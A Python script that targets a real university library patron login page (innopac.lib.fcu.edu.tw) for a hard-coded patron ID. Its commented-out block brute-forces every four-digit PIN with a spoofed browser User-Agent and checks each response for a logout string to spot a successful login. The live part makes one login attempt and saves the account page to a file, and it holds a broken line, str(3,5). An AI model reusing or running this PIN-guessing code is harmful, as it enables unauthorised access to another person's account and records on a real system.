import requests

url='https://innopac.lib.fcu.edu.tw/patroninfo*cht'
payloads={
    'code': 'd0948511',
'pin': '5',
'submit': '登入'
}
seesion = requests.session()
flag=0
'''for i in range(9,0,-1):
    if flag==1:
        break
    elif flag==0:
        for j in range(9,0,-1):
            if flag==1:
                break
            if flag==0:
                for k in range(9,0,-1):
                    if flag==1:
                        break
                    if flag==0:
                        for l in range(9,0,-1):
                            if flag==1:
                                break
                            
                            payloads['pin']=str(i)+str(j)+str(k)+str(l)
                            #print(f'{payloads}')

                            header={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
                            }
                            #p = requests.post(url, data=payloads,headers=header)
                            seesion.post(url, headers = header, data = payloads)
                            response = seesion.get('https://innopac.lib.fcu.edu.tw/patroninfo~S9*cht/1178687/top', headers = header)
                            #print(response.text)
                            if '登出' in response.text:
                                flag=1
                                print('1')
                              '''  
                # print the html returned or something more intelligent to see if it's a successful login page.
             


header={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
                }               # An authorised request.

payloads['pin']=str(3,5)
print(payloads)
seesion.post(url, headers = header, data = payloads)
response = seesion.get('https://innopac.lib.fcu.edu.tw/patroninfo~S9*cht/1178687/top', headers = header)
if '登出' in response.text:
    print('1')
with open("renren3.html", "w", encoding="utf-8") as f:
    f.write(response.content.decode())

#blk-pat-info
#
